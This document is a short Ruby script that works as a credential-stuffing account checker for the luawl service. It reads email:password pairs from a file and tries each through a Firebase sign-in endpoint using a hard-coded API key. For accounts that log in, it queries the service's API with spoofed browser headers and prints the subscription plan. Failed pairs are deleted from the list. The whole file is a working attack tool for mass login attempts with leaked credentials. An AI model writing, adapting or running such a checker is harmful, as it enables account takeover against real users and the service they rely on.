require 'net/http'
require 'uri'
require 'json'

API_KEY = "AIzaSyCio3wiwvwX1bkk5lSNXMnT6maKMPkfgrQ"

def get_token(uemail, upass, key)
  uri = URI("https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=" + key)
  request = Net::HTTP::Post.new(uri)
  request.content_type = "application/json"
  request.body = {
    returnSecureToken: true,
    email: uemail,
    password: upass,
  }.to_json

  response = Net::HTTP.start(uri.hostname, uri.port, use_ssl: true) do |http|
    http.request(request)
  end

  json = JSON.parse(response.body)
  json["idToken"]
end

def get_plan(token)
  uri = URI("https://api2.luawl.com/validateLoginFB.php")
  request = Net::HTTP::Post.new(uri)
  request["Authorization"] = "Bearer " + token
  request["Origin"] = "https://dashboard.luawl.com"
  request["Sec-Fetch-Site"] = "same-site"
  request["Sec-Fetch-Mode"] = "cors"
  request["Sec-Fetch-Dest"] = "empty"
  request["Host"] = "api2.luawl.com"
  request["Content-Type"] = "application/json"
  request["Referer"] = "https://dashboard.luawl.com/"

  response = Net::HTTP.start(uri.hostname, uri.port, use_ssl: true) do |http|
    http.request(request)
  end

  json = JSON.parse(response.body)
  json["data"][0]["plan_name"]
end

def get_tokens_from_file(file, key)
  File.open(file).each do |line|
    email, pass = line.split(":")
    token = get_token(email, pass, key)
    if token.nil?
      lines = File.readlines(file).reject { |l| l.include?(line) }
      File.write(file, lines.join)
    else
      plan = get_plan(token)
      puts "\e[32m" + line + "\e[0m" + " - " + plan
    end
  end
end

get_tokens_from_file("pass.txt", API_KEY)
